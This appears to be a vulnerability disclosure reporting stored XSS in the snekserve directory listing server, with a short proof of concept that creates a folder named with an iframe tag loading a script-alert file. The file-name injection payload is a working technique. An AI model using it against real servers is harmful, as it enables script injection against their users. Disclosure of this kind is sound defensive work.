# Description

The `snekserve` project is a `directory listing` server which is vulnerable against `stored XSS` because the `filename` isn't checked correctly, leading to `HTML/JS injection`

# POC

1. Create a PoC file like this:

```html
<!-- malicious.html -->
<script>alert(document.domain)</script>
```

2. Run the following commands: `npm i snekserve -g # Installs the CLI version of the module`
3. `mkdir '<iframe src=..\malicious.html>' # Creates the malicious *HTML formatted* folder`
4. `snekserve # Starts the server`
5. Open a browser and go on http://localhost:8080
6. `XSS` triggered

**Notes:**
The attack can work even if the `malicious file` isn't inside the server it-self, and while the attacker needs a limited access to the `system` to create a new `malicious filename`, it could be possible when it's used among other `ECM` softwares.
